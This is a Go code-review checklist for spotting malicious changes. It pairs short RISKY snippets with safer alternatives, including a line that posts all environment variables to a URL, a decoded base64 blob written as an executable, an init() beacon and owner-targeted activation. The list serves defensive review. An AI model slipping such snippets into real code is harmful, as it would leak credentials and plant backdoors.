## Go Review Criteria
- Shell-mediated exec: Note exec.Command("sh","-c", s) or command strings built by concatenation. RISKY: exec.Command("bash","-c","git clone "+repo)  SAFER: exec.Command("git","clone",repo)
- Env-to-network flow: Note os.Environ()/os.Getenv for tokens combined with new net/http/net calls or new destination hosts. RISKY: http.Post(u,"text/plain", strings.NewReader(strings.Join(os.Environ(),"\n")))  SAFER: env used only for documented config
- go.mod redirection: Note new replace directives pointing at forks or local paths, or new modules from unfamiliar hosts. RISKY: replace github.com/known/lib => github.com/unknown/lib v0.0.1  SAFER: no replace directives; well-known module paths
- Low-level escape hatches: Note newly added unsafe, syscall, plugin, or cgo where none existed. RISKY: new import "plugin" + plugin.Open(path)  SAFER: standard library only, unchanged
- Embedded payloads: Note large base64/hex constants decoded and written to disk or executed. RISKY: b,_ := base64.StdEncoding.DecodeString(blob); os.WriteFile("/usr/local/bin/x", b, 0755)  SAFER: no embedded binaries (flag presence; do not decode)
- Conditional activation: Note logic branching on GITHUB_REPOSITORY/owner env vars, hostnames, or dates. RISKY: if os.Getenv("GITHUB_REPOSITORY_OWNER") == "target" { ... }  SAFER: uniform behavior
- Init-time side effects: Note new init() functions performing network or filesystem writes. RISKY: func init(){ http.Get(beacon) }  SAFER: side effects only in explicit, called code paths
